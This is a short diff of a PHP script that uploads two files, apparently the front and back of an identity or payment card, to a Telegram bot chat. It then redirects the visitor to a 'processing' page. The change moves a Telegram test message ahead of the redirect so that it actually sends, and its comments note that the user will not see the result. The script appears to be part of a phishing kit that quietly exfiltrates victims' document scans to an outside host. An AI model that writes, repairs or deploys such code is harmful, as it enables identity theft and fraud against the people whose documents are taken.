@@ -39,10 +39,13 @@ function sendDocument($botToken, $chatId, $file){
 sendDocument($botToken, $chatId, $frontFile);
 sendDocument($botToken, $chatId, $backFile);
 
+// --- Move the "Test message" here if you want it to run ---
+// The redirect means the user won't see the var_dump result, 
+// but the message will be sent.
+$result = file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode("Test message"));
+// var_dump($result); // This will not be visible to the user because of the redirect
+
 // --- Redirect user to processing page ---
 header("Location: processing.html");
 exit;
-
-$result = file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode("Test message"));
-var_dump($result);
 ?>
